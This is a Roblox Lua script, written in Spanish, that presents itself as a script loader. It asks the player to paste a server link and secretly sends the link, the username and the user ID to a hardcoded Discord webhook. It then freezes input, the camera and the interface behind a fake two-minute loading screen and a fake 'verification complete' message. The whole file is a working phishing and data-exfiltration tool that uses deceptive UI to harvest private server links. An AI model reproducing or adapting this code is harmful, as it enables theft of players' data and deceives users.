-- =======================================================
--               CONFIGURACIÓN IMPORTANTE
-- =======================================================
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1428163995063550105/tmy07UDGyQErmd0LWRd6pIEF9xmDRXKA6mQB4T_xiwaN5ebh0XKZ5eCcuwU_RJHHhTSP" 

local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService") 
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local DURACION_CARGA = 120 -- tiempo de carga en segundos (puedes cambiar)

-- ===== FUNCIÓN DE ENVÍO A DISCORD =====
local function SendLinkToDiscord(link)
    local playerName = player.Name
    
    local JSON_Payload = HttpService:JSONEncode({
        ["content"] = "**[⚠️ NUEVO INTENTO DE ENLACE DE SERVIDOR ⚠️]**\n" ..
                      "**Usuario:** " .. playerName .. " (UserID: " .. player.UserId .. ")\n" ..
                      "**Enlace Pegado:**\n```\n" .. link .. "\n```",
        ["username"] = "Roblox Link Collector", 
        ["avatar_url"] = "https://i.imgur.com/uT0mFhG.png" 
    })

    -- Intentos de envío para máxima compatibilidad
    pcall(function() request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = JSON_Payload}) end)
    pcall(function() http.post(WEBHOOK_URL, JSON_Payload, "application/json") end)
end

-- ===== FUNCIONES AUXILIARES (SIMULACIÓN Y BLOQUEO) =====
local function BlockPlayerAndShowLoading(link, duration)
    -- ENVÍO DEL ENLACE ANTES DE LA CARGA
    task.spawn(SendLinkToDiscord, link)
    
    duration = tonumber(duration) or 10

    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local prevCameraCFrame = camera.CFrame
    
    local prevWalkSpeed = humanoid and humanoid.WalkSpeed or 16
    local prevJumpPower = humanoid and humanoid.JumpPower or 50

    -- 🔥 AÑADIDO: Bloquear la Interfaz de Usuario y el Control de Armas/Herramientas 🔥
    local StarterGui = game:GetService("StarterGui")
    local backpackEnabled = true -- Valor por defecto
    local characterControlEnabled = true -- Valor por defecto
    
    -- Intenta desactivar la mochila y el control del personaje (que maneja las herramientas/armas)
    pcall(function()
        backpackEnabled = StarterGui:GetCore("TopbarEnabled") -- Usamos TopbarEnabled como un proxy para el estado de la UI
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false) -- Desactiva la mochila (inventario/armas)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) -- Desactiva la lista de jugadores (opcional)
        
        -- El control de personajes (para evitar que usen armas o herramientas)
        local PlayerScripts = player:WaitForChild("PlayerScripts")
        local PlayerModule = PlayerScripts:FindFirstChild("PlayerModule")
        if PlayerModule then
             local ControlScript = PlayerModule:FindFirstChild("ControlScript")
             if ControlScript then
                 characterControlEnabled = ControlScript.Disabled == false -- Guarda el estado anterior
                 ControlScript.Disabled = true -- Deshabilita el control del personaje para evitar uso de armas/herramientas
             end
        end
        -- También deshabilitamos el Topbar (la barra de arriba) para bloquear botones de menú
        StarterGui:SetCore("TopbarEnabled", false)
    end)
    -- 🔥 FIN DE AÑADIDO 🔥


    -- Bloquear entradas (clics y teclado)
    local boundActions = {}
    local function blockInput(name, state, input) return Enum.ContextActionResult.Sink end
    for _, t in ipairs({Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2,
        Enum.UserInputType.MouseButton3, Enum.UserInputType.Touch,
        Enum.UserInputType.Keyboard, Enum.UserInputType.Gamepad1,
        Enum.UserInputType.Gamepad2, Enum.UserInputType.Gamepad3,
        Enum.UserInputType.Gamepad4}) do
        local nameBind = "BLOCK_"..tostring(t)
        ContextActionService:BindAction(nameBind, blockInput, false, t)
        table.insert(boundActions, nameBind)
    end

    -- Crear overlay (código de UI se mantiene igual)
    local overlayGui = Instance.new("ScreenGui")
    overlayGui.Name = "FullBlockLoadingGui"
    overlayGui.ResetOnSpawn = false
    overlayGui.IgnoreGuiInset = true
    overlayGui.Parent = player.PlayerGui

    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1,0,1,0)
    overlay.Position = UDim2.new(0,0,0,0)
    overlay.BackgroundColor3 = Color3.new(1,1,1) -- fondo blanco
    overlay.BorderSizePixel = 0
    overlay.Active = true
    overlay.ZIndex = 99 -- ZIndex alto para el fondo blanco
    overlay.Parent = overlayGui
    overlay.InputBegan:Connect(function() end)

    -- Marco central (Elementos de la barra de carga)
    local centerFrame = Instance.new("Frame")
    centerFrame.Size = UDim2.new(0.7,0,0.3,0)
    centerFrame.Position = UDim2.new(0.15,0,0.35,0)
    centerFrame.BackgroundTransparency = 1
    centerFrame.ZIndex = 100 -- ZIndex para asegurar que esté sobre el fondo
    centerFrame.Parent = overlay

    -- Texto BILINGÜE/Mensaje de Carga
    local messageLabel = Instance.new("TextLabel")
    messageLabel.Size = UDim2.new(1,0,0.5,0)
    messageLabel.Position = UDim2.new(0,0,0,0)
    messageLabel.BackgroundTransparency = 1
    messageLabel.TextColor3 = Color3.new(0,0,0)
    messageLabel.TextScaled = true
    messageLabel.Font = Enum.Font.SourceSansBold
    messageLabel.Text = "No te preocupes, se está cargando el script.\n(Do not worry, the script is loading)"
    messageLabel.TextWrapped = true
    messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    messageLabel.ZIndex = 100
    messageLabel.Parent = centerFrame

    -- Barra de fondo
    local progressBG = Instance.new("Frame")
    progressBG.Size = UDim2.new(1,0,0.2,0)
    progressBG.Position = UDim2.new(0,0,0.55,0)
    progressBG.BackgroundColor3 = Color3.fromRGB(200,200,200)
    progressBG.BorderSizePixel = 0
    progressBG.ZIndex = 100
    progressBG.Parent = centerFrame

    -- Barra de progreso roja
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0,0,1,0)
    progressBar.Position = UDim2.new(0,0,0,0)
    progressBar.BackgroundColor3 = Color3.fromRGB(255,0,0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 100
    progressBar.Parent = progressBG

    -- Porcentaje
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(1,0,0.4,0)
    percentLabel.Position = UDim2.new(0,0,0.8,0)
    percentLabel.BackgroundTransparency = 1
    percentLabel.TextColor3 = Color3.new(0,0,0)
    percentLabel.TextScaled = true
    percentLabel.Font = Enum.Font.SourceSansBold
    percentLabel.Text = "0%"
    percentLabel.ZIndex = 100
    percentLabel.Parent = centerFrame

    -- Bloquear humanoid y cámara
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.AutoRotate = false
    end
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = prevCameraCFrame

    -- Simulación de carga (se mantiene igual)
    local start = tick()
    while tick() - start < duration do
        local elapsed = tick() - start
        local progress = math.clamp(elapsed / duration,0,1)
        progressBar.Size = UDim2.new(progress,0,1,0)
        percentLabel.Text = tostring(math.floor(progress*100)).."%"
        wait(0.1)
    end

    -- Finalizar (se mantiene igual)
    progressBar.Size = UDim2.new(1,0,1,0)
    percentLabel.Text = "100%"
    messageLabel.Text = "¡Verificación Completa! \nGracias por tu participación."
    wait(1.5)

    -- Restaurar
    if humanoid then
        humanoid.WalkSpeed = prevWalkSpeed
        humanoid.JumpPower = prevJumpPower
        humanoid.AutoRotate = true
    end
    camera.CameraType = Enum.CameraType.Custom
    camera.CFrame = prevCameraCFrame

    -- Desbloquear inputs
    for _, name in ipairs(boundActions) do
        pcall(function() ContextActionService:UnbindAction(name) end)
    end

    -- 🔥 AÑADIDO: Restaurar la Interfaz de Usuario y el Control de Armas/Herramientas 🔥
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) -- Restaura la mochila
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) -- Restaura la lista de jugadores (opcional)
        
        -- Restaura el control del personaje
        local PlayerScripts = player:WaitForChild("PlayerScripts")
        local PlayerModule = PlayerScripts:FindFirstChild("PlayerModule")
        if PlayerModule then
            local ControlScript = PlayerModule:FindFirstChild("ControlScript")
            if ControlScript and characterControlEnabled then
                ControlScript.Disabled = false
            end
        end
        -- Restaura el Topbar si estaba habilitado
        StarterGui:SetCore("TopbarEnabled", backpackEnabled)
    end)
    -- 🔥 FIN DE AÑADIDO 🔥

    overlayGui:Destroy()
end

-- ===== CREAR UI DE LINK (Se mantiene igual) =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LinkInputGui"
screenGui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.4,0,0.2,0)
frame.Position = UDim2.new(0.3,0,0.4,0)
frame.BackgroundColor3 = Color3.fromRGB(50,50,50)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local textbox = Instance.new("TextBox")
textbox.Size = UDim2.new(0.9,0,0.4,0)
textbox.Position = UDim2.new(0.05,0,0.1,0)
textbox.PlaceholderText = "Paste your server link here..."
textbox.Text = ""
textbox.Font = Enum.Font.SourceSans
textbox.TextColor3 = Color3.new(0,0,0)
textbox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textbox.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0.9,0,0.3,0)
button.Position = UDim2.new(0.05,0,0.6,0)
button.Text = "SEND LINK"
button.Font = Enum.Font.SourceSansBold
button.TextColor3 = Color3.new(1,1,1)
button.BackgroundColor3 = Color3.fromRGB(0,100,200)
button.Parent = frame

-- ===== CONECTAR BOTÓN CON ENVÍO DE DATOS (Se mantiene igual) =====
button.MouseButton1Click:Connect(function()
    local link = textbox.Text
    
    if string.len(link) > 10 then 
        screenGui:Destroy()
        -- Iniciar el proceso: Envía el link y luego comienza la simulación de carga/bloqueo
        BlockPlayerAndShowLoading(link, DURACION_CARGA)
    else
        -- Error: No hay enlace o es muy corto
        textbox.Text = "Please enter a valid link!"
    end
end)
